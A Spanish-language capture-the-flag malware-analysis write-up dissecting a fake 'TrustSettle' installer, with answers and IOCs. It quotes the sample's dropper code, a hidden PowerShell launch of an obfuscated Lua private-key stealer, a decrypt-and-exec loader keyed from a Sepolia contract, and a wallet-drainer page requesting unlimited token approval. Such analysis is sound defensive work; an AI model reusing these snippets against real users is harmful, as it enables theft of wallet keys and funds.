# Holmes CTF 2026 — Sherlock 01: Silent Dividend

**Categoría:** Malware analysis / Web3
**Muestra:** `danger.zip` (contraseña `E9$LQ2@Mr7A!`) → `TrustSettle 1.0.0.exe`
**Entorno de análisis:** Linux (Arch), sin ejecutar la muestra en Windows. Todo el análisis es
estático salvo la desofuscación del Lua, hecha en un sandbox con las llamadas Win32 simuladas.

---

## 0. Resumen de la cadena

`TrustSettle` se presenta como una app de liquidaciones. Es un instalador NSIS que empaqueta una
aplicación Electron con dos cargas útiles independientes:

```
TrustSettle 1.0.0.exe  (NSIS)
└── app-64.7z
    ├── extraResources/   luajit.exe, lua51.dll, api.txt, .env
    ├── src/              index.html, settlement.html, renderer.js
    └── resources/app.asar
        ├── main.js       crea la BrowserWindow con nodeIntegration + preload
        └── preload.js    ← el dropper
```

`preload.js` hace tres cosas al arrancar la ventana:

1. **Dropper.** Copia todo `extraResources/` a `C:\Users\Public` y lanza, oculto por PowerShell,
   `luajit.exe api.txt` → *stealer* que vigila ese directorio y exfiltra el `.env` (que el README
   pide rellenar con la `PRIVATE_KEY` del monedero) vía WinHTTP.
2. **C2 en blockchain.** Copia `settlement.html` a `%TEMP%`, lee `resolveState()` de un contrato en
   Sepolia y usa el `bytes32` devuelto como clave para descifrar un blob embebido, que pasa a
   `exec()` → así el comando final nunca está en el binario.
3. **Drainer.** El `settlement.html` abierto es un falso "Terms of Service" que pide
   `approve(drainer, MaxUint256)` sobre un token, cediendo gasto ilimitado.

El diseño del reto es doble: la **flag 1** vive en el payload cifrado por el contrato del Electron,
y la **flag 2** vive en la lógica del contrato *drainer* referenciado por la página HTML.

---

## 1. Desempaquetado del instalador (sin 7-Zip)

El `.exe` es un SFX de Nullsoft. En electron-builder el `app-64.7z` interno se almacena **sin
compresión adicional**, así que su cabecera aparece en claro dentro del binario:

```bash
file "TrustSettle 1.0.0.exe"
# PE32 executable ... Nullsoft Installer self-extracting archive

python3 -c "d=open('TrustSettle 1.0.0.exe','rb').read(); print(d.find(b'7z\xbc\xaf\x27\x1c'))"
# 50496

dd if="TrustSettle 1.0.0.exe" of=app.7z bs=1 skip=50496
bsdtar -tf app.7z            # libarchive lee 7z: no hace falta p7zip
bsdtar -xf app.7z -C x "extraResources/*" "src/*" "resources/app.asar"
```

Para `app.asar`, el formato es un header de cuatro `uint32` seguido del JSON de índice; **los datos
empiezan en `8 + segundo uint32`** (usar `16 + jsonLen` desalinea los ficheros unos bytes):

```python
import json, struct
f = open("x/resources/app.asar", "rb")
_, hdr_size, _, json_len = struct.unpack('<IIII', f.read(16))
index = json.loads(f.read(json_len))
base = 8 + hdr_size          # ← clave
# luego, por fichero: f.seek(base + entry['offset']); f.read(entry['size'])
```

Salen `main.js` (812 B), `preload.js` (5.8 KB), `src/index.html`, `src/renderer.js` y
`src/settlement.html`.

---

## 2. El dropper — `preload.js`

`main.js` solo abre la ventana (`contextIsolation: false`, `nodeIntegration: true`) con
`preload.js`, que se ejecuta con privilegios de Node en el renderer.

### Q1 — ¿A qué directorio copia la aplicación los ficheros de `extraResources`?

En `preload.js:21`, en una sola línea:

```js
fs.readdirSync(path.resolve(`${process.resourcesPath}/../extraResources`))
  .forEach(f => fs.copyFileSync(
      path.resolve(`${process.resourcesPath}/../extraResources`, f),
      path.join('C:\\Users\\Public', f)));
```

`process.resourcesPath` solo se usa para el **origen**; el destino está hardcodeado.

> **Respuesta: `C:\Users\Public`**

Tres confirmaciones independientes:

- La línea siguiente ejecuta lo que acaba de copiar:
  ```js
  exec("powershell.exe -exec bypass -w hidden -nop -c \"& 'C:\\Users\\Public\\luajit.exe' 'C:\\Users\\Public\\api.txt'\"");
  ```
- El `README.md` del ZIP pide rellenar el `.env` "located in the `C:\Users\Public\` directory".
- El propio script Lua vigila `C:\users\public\` (ver §3).

El `.env` viene vacío en el paquete: es el cebo. El usuario mete ahí su `PRIVATE_KEY` y el stealer
detecta la escritura.

---

## 3. El stealer Lua — `api.txt`

`api.txt` (66 KB) es Lua ofuscado con una VM tipo *luaobfuscator*: un `return(function(...) ... end)(...)`
con una tabla de 172 strings codificadas y aritmética basura en cada constante.

### 3.1 Capa de strings (estático)

Cada entrada de la tabla lleva un prefijo que indica el códec, con **alfabetos custom** declarados
como dos tablas de Lua (`k` → base85, `M` → base64) cuyos valores son expresiones aritméticas:

```
prefijo 'n' → base85: grupos de 5 chars → 4 bytes (J = J*85 + dígito), padding con el valor 84
prefijo 'Q' → base64: grupos de 4 chars → 3 bytes, relleno con '='

alfabeto base85 (k): 64G,'R*FnBLC8]lMrQ;e+Pa@/5U7%q>Wp\cd:$i#1t!^sJ&YS=.NA2ImZDfj<()K`?0k3XhVgu-"O_TobH[9E
alfabeto base64 (M): wVI3QRmGATM7DnPXHZsC8cENget1Y4yjxr6oBkS0+bulUpaLhOFJKvWfq2iz/d95
```

Reimplementando los dos códecs en Python (parseando y evaluando las tablas del propio fichero) se
recupera la tabla: son solo los nombres del *bootstrap* de la VM (`pcall`, `require`, `string`,
`gsub`, `__index`, …), varios nombres aleatorios usados como globals internos y un
`'Tamper Detected!'`. El cuerpo real del script está en una entrada binaria de 2242 bytes: es el
**bytecode de la VM**, no strings. Vía estática pura habría que emular la VM.

### 3.2 Ejecución instrumentada (dinámico, sin Windows)

Camino más corto: ejecutar el script tal como lo espera (LuaJIT) pero con el entorno bajo control.
No hay `luajit` en el sistema y no quería `sudo`, así que lo compilé en local:

```bash
git clone --depth 1 https://github.com/LuaJIT/LuaJIT.git luajit-src && cd luajit-src && make -j8
# → src/luajit
```

Y un *harness* (`hook.lua`) que:

- carga `api.txt` con `loadstring` y le pone con `setfenv` un entorno **proxy** que loguea cada
  acceso a global;
- sustituye `ffi` por un stub cuyo `ffi.cdef` **imprime la declaración completa** y cuyo
  `ffi.load` devuelve un objeto que loguea cada llamada;
- neutraliza `io` y `os` (sin filesystem ni procesos reales);
- aporta una implementación en Lua puro de `bit` por si se ejecutase bajo Lua 5.1.

**El detalle que bloquea el análisis:** los globals que la VM no encuentra deben devolver **`nil`**.
Si el proxy devuelve un objeto stub "universal" (lo intuitivo para no romper nada), la VM aborta con
`attempt to perform arithmetic on local 'E' (a nil value)`; la VM comprueba que su entorno está
limpio y sus propios slots (`6OLcXLFw2h62P5`, `ZWVmzbNH0Ybl9`, …) valen `nil` al principio. Con
`nil` el script corre entero:

```bash
./luajit-src/src/luajit hook.lua api.txt trace.log
# ok= true
```

El `ffi.cdef` volcado da de golpe toda la superficie Win32 del stealer:

```c
HINTERNET WinHttpOpen(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
HINTERNET WinHttpConnect(HINTERNET, LPCWSTR, WORD, DWORD);
HINTERNET WinHttpOpenRequest(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
BOOL      WinHttpSendRequest(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD*);
BOOL      WinHttpReceiveResponse(HINTERNET, LPVOID);
BOOL      WinHttpQueryDataAvailable(HINTERNET, DWORD*);
BOOL      WinHttpReadData(HINTERNET, LPVOID, DWORD, DWORD*);
BOOL      WinHttpCloseHandle(HINTERNET);

HANDLE CreateFileW(const WCHAR*, DWORD, DWORD, void*, DWORD, DWORD, HANDLE);
BOOL   ReadDirectoryChangesW(HANDLE, void*, DWORD, BOOL, DWORD, DWORD*, void*, void*);
BOOL   CloseHandle(HANDLE);
DWORD  GetLastError(void);

typedef struct {
    DWORD NextEntryOffset;
    DWORD Action;
    DWORD FileNameLength;
    WCHAR FileName[1];
} FILE_NOTIFY_INFORMATION;
```

Y el log de llamadas reconstruye el comportamiento:

```
[call] ffi.load("winhttp")
[call] ffi.load("kernel32")
[call] ffi.cast("HANDLE", -1)            -- INVALID_HANDLE_VALUE
[call] ffi.new("wchar_t[?]", 17)         -- L"C:\users\public\"
[call] ffi.new("char[?]", 4096)          -- buffer de notificaciones
[call] ffi.new("DWORD[1]")               -- lpBytesReturned
[call] kernel32.ReadDirectoryChangesW(<hDir>, <char[4096]>, 4096, false, 25, <DWORD[1]>, nil, nil)
```

`CreateFileW` abre el directorio y `ReadDirectoryChangesW` lo vigila de forma **síncrona**
(`lpOverlapped = nil`), sin subárboles, con filtro `25` = `0x19` =
`FILE_NOTIFY_CHANGE_FILE_NAME | FILE_NOTIFY_CHANGE_SIZE | FILE_NOTIFY_CHANGE_LAST_WRITE`: exactamente
lo que dispara cuando la víctima guarda su `.env` con la clave privada.

### Q2 — ¿Qué estructura Win32 define el formato del buffer devuelto por el script Lua al monitorizar cambios de directorio?

El `char[4096]` que se pasa a `ReadDirectoryChangesW` se interpreta como la estructura declarada en
el `cdef` (`NextEntryOffset` / `Action` / `FileNameLength` / `FileName[1]`, la lista enlazada clásica
de la API).

> **Respuesta: `FILE_NOTIFY_INFORMATION`**

### Q3 — ¿Qué API Win32 usa el script Lua para enviar la petición HTTP al servidor remoto?

De la familia `WinHttp*` declarada, la que **envía** la petición (las demás abren la sesión, conectan,
crean el handle o leen la respuesta) es:

> **Respuesta: `WinHttpSendRequest`**

*(Nota: una segunda pasada del harness, simulando un evento `.env` y handles WinHTTP falsos para
capturar host y ruta del C2, quedó fuera del alcance; no afecta a ninguna respuesta.)*

---

## 4. El C2 en blockchain — flag del Electron

De vuelta en `preload.js`:

```js
const CONTRACT_ADDRESS = '0xbB63Ae28E4f75C9392bae69cDf5394Ca0ACdA6B1';
const RPC_URL          = 'https://ethereum-sepolia-rpc.publicnode.com';
const CONTRACT_ABI     = ['function resolveState() view returns (bytes32)'];
const ENCRYPTED_DATA   = '0x560c325bdd0aeea2...84864f0';   // 91 bytes
```

`initializeVault()` copia el HTML, pide el estado al contrato, descifra y ejecuta:

```js
const indexContent = fs.readFileSync(path.join(__dirname, 'src', 'settlement.html'), 'utf8');
fs.writeFileSync(path.resolve(`${process.resourcesPath}/../../settlement.html`), indexContent, 'utf8');
const state     = await queryRemoteState();                  // contract.resolveState()
const decrypted = decryptEmbeddedData(ENCRYPTED_DATA, state);
exec(decrypted);
```

### Q4 — ¿Qué función del smart contract invoca la app Electron para obtener la clave de descifrado?

El ABI declara una sola función y `queryRemoteState()` la llama directamente
(`await contract.resolveState()`); el `bytes32` devuelto se pasa como `encryptionKey`.

> **Respuesta: `resolveState()`**

### Q5 — Investiga el contrato, analiza su lógica y recupera la flag descifrando el dato cifrado

El cifrado es casero, byte a byte (`decryptEmbeddedData`): XOR con la clave rotada, rotación a la
izquierda de 7 bits (equivalente a `ror 1`) y XOR con la constante `0x42`.

Primero, la clave desde Sepolia:

```bash
export ETH_RPC_URL=https://ethereum-sepolia-rpc.publicnode.com
cast call 0xbB63Ae28E4f75C9392bae69cDf5394Ca0ACdA6B1 "resolveState()(bytes32)"
# 0x3460743bb1ce2e6209e65e8ee3023f8414bc8416aef842b69c2a318bcef952f4
```

Y el descifrado (el mismo algoritmo es su propio inverso tal como está escrito):

```python
enc = bytes.fromhex("560c325bdd0aeea2cd2690a2ed1c1b4a28deca7ac2a40ce8d2725d539a950ca8"
                    "f4a4bcf375806c36532258a0cf16c19c12989e0aa0e25a72be241da7d2f74cfa"
                    "2c4c4e1bbfc6204207fe5c801d201f5af84864f0")
key = bytes.fromhex("3460743bb1ce2e6209e65e8ee3023f8414bc8416aef842b69c2a318bcef952f4")
out = bytearray()
for i, b in enumerate(enc):
    s1 = b ^ key[i % len(key)]
    s2 = ((s1 << 7) | (s1 >> 1)) & 0xff
    out.append(s2 ^ 0x42)
print(out.decode())
```

```
start "" "%TEMP%\settlement.html" && echo AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821
```

> **Respuesta: `AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821`**

El comando descifrado es a la vez la flag y la pieza que abre el falso ToS en el navegador.

### Q6 — ¿Qué variable de entorno corresponde al directorio donde la app copia el HTML de su paquete?

`preload.js` escribe el HTML en `${process.resourcesPath}/../../settlement.html`, y el comando
descifrado lo abre con `start "" "%TEMP%\settlement.html"`: ambos apuntan al mismo sitio, el
directorio temporal.

> **Respuesta: `TEMP`** (`%TEMP%`)

---

## 5. El drainer — `settlement.html`

La página es un "Terms of Service Agreement" con un checkbox y un botón *I Agree*. Toda la lógica
está en el `<script>` final:

```js
const X0_CONTRACT_ADDRESS = "0x69Bf5b7aBA51C3Ee8bF169aB47479ba95DBF709D";  // drainer
const MOCK_TOKEN_ADDRESS  = "0x6B2B0C0d0a376255Ac70Bf1366f50982bF476Bb2";  // token
```

```js
async function connect() {
    provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = await provider.getSigner();
    ...
    await requestApproval();
}

async function requestApproval() {
    const token = new ethers.Contract(MOCK_TOKEN_ADDRESS, MOCK_TOKEN_ABI, signer);
    const unlimitedAmount = ethers.MaxUint256;
    const tx = await token.approve(X0_CONTRACT_ADDRESS, unlimitedAmount);
    await tx.wait();
}
```

### Q7 — ¿Qué función del token llama la página HTML para pedir permiso de gasto?

El ABI embebido solo declara `approve`, `balanceOf` y `mint`; la que concede permiso de gasto a un
tercero es la estándar ERC-20:

> **Respuesta: `approve()`**

### Q8 — ¿Cuál es la cantidad exacta pasada a la llamada de aprobación?

`ethers.MaxUint256`, es decir `2²⁵⁶ − 1` (`0xffff…ff`, 64 `f`): aprobación **ilimitada**, el patrón
clásico de *approval drainer*.

> **Respuesta: `115792089237316195423570985008687907853269984665640564039457584007913129639935`**

### Q9 — ¿Qué clase provider de ethers.js v6 se usa para conectar con el monedero del navegador?

`new ethers.BrowserProvider(window.ethereum)` (en v5 era `Web3Provider`; la página carga
`ethers@6.13.2` desde jsDelivr).

> **Respuesta: `BrowserProvider`**

### Q10 — Analiza la página para descubrir una referencia a un contrato; estudia su lógica y averigua cómo interactuar con él para recuperar la flag oculta

El contrato referenciado es el *spender*, `0x69Bf5b7aBA51C3Ee8bF169aB47479ba95DBF709D` (Sepolia). No
tiene ABI publicada, así que se trabaja desde el bytecode:

```bash
export ETH_RPC_URL=https://ethereum-sepolia-rpc.publicnode.com
cast code 0x69Bf5b7aBA51C3Ee8bF169aB47479ba95DBF709D > drainer.hex
cast selectors --resolve $(cat drainer.hex)
```

```
0x0bfac020   string    nonpayable   x8(bytes)
0x282940a7             view         x7()
0x343943bd             view         x1()
0x8f7f391e   address   nonpayable   x11(address)
0xf8e6e11f   address   view         x9(address)
```

Nombres deliberadamente opacos, pero los **strings de revert** del bytecode marcan el camino:

```
"already set"                  → x8(bytes), ya inicializado
"only hidden owner"            → hay un rol oculto
"not quite - keep analyzing"   → guardia del getter de la flag
```

Sondeando los dos getters `view`:

```bash
cast call 0x69Bf...709D "x1()"    # 0x...6b2b0c0d0a376255ac70bf1366f50982bf476bb2  → el token mock
cast call 0x69Bf...709D "x7()"    # 0x...ebfc1ed96b1c6b940fb6b06359ff4a6776df7a9a  → hidden owner
```

`x9(address)` con cualquier dirección revierte con `not quite - keep analyzing`; el truco es que el
guardia no compara `msg.sender`, sino el **argumento**, así que basta pasar el *hidden owner* que
publica `x7()` — se puede leer sin firmar nada, con un simple `eth_call`:

```bash
cast call 0x69Bf5b7aBA51C3Ee8bF169aB47479ba95DBF709D "x9(address)(string)" \
     0xebfc1ed96b1c6b940fb6b06359ff4a6776df7a9a
# "51.5049,0.0348"
```

> **Respuesta: `51.5049,0.0348`**

Unas coordenadas (zona de Canary Wharf, Londres) — el punto de encuentro que cierra la narrativa del
Sherlock.

---

## 6. Tabla de respuestas

| # | Pregunta | Respuesta |
|---|---|---|
| 1 | Directorio destino de `extraResources` | `C:\Users\Public` |
| 2 | Estructura Win32 del buffer de cambios de directorio | `FILE_NOTIFY_INFORMATION` |
| 3 | API Win32 que envía la petición HTTP | `WinHttpSendRequest` |
| 4 | Función del contrato que da la clave de descifrado | `resolveState()` |
| 5 | Flag del payload descifrado | `AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821` |
| 6 | Variable de entorno del directorio del HTML | `TEMP` |
| 7 | Función del token para pedir permiso de gasto | `approve()` |
| 8 | Cantidad exacta del approve | `115792089237316195423570985008687907853269984665640564039457584007913129639935` |
| 9 | Clase provider de ethers.js v6 | `BrowserProvider` |
| 10 | Flag del contrato de la página HTML | `51.5049,0.0348` |

## 7. IOCs

| Tipo | Valor |
|---|---|
| Fichero | `TrustSettle 1.0.0.exe` (NSIS, 95 MB) |
| Dropeados | `C:\Users\Public\{luajit.exe, lua51.dll, api.txt, .env}` |
| Dropeado | `%TEMP%\settlement.html` |
| Ejecución | `powershell.exe -exec bypass -w hidden -nop -c "& 'C:\Users\Public\luajit.exe' 'C:\Users\Public\api.txt'"` |
| Comando | `start "" "%TEMP%\settlement.html"` (desde payload cifrado) |
| Monitorización | `ReadDirectoryChangesW` sobre `C:\users\public\`, filtro `0x19` |
| Exfiltración | WinHTTP (`WinHttpOpen`/`Connect`/`OpenRequest`/`SendRequest`) |
| Contrato (clave) | `0xbB63Ae28E4f75C9392bae69cDf5394Ca0ACdA6B1` (Sepolia) |
| Contrato (drainer) | `0x69Bf5b7aBA51C3Ee8bF169aB47479ba95DBF709D` (Sepolia) |
| Contrato (token) | `0x6B2B0C0d0a376255Ac70Bf1366f50982bF476Bb2` (Sepolia) |
| Hidden owner | `0xebfc1ed96b1c6b940fb6b06359ff4a6776df7a9a` |
| RPC | `https://ethereum-sepolia-rpc.publicnode.com` |

## 8. Lecciones reutilizables

1. **NSIS de electron-builder sin p7zip:** el `app-64.7z` va sin comprimir; carvear por magic
   `37 7A BC AF 27 1C` y abrir con `bsdtar` (libarchive lee 7z).
2. **`app.asar`:** los datos empiezan en `8 + segundo uint32` del header.
3. **VM de luaobfuscator:** en vez de emular la VM, ejecutarla con `setfenv` a un entorno proxy y un
   stub de `ffi`. Los globals desconocidos deben devolver `nil`, o la VM detecta el entorno sucio y
   muere. Un solo `ffi.cdef` revela toda la superficie de API del malware.
4. **C2 sobre blockchain:** un `view` en una testnet como canal de claves no deja infraestructura que
   tumbar, pero es totalmente auditable a posteriori — y el analista puede descifrar el payload sin
   ejecutar nada.
5. **Contratos sin ABI:** `cast selectors --resolve` + los strings de revert dan el mapa; y conviene
   comprobar si el guardia valida `msg.sender` o un **argumento** (aquí, lo segundo: flag por
   `eth_call`, sin firmar).
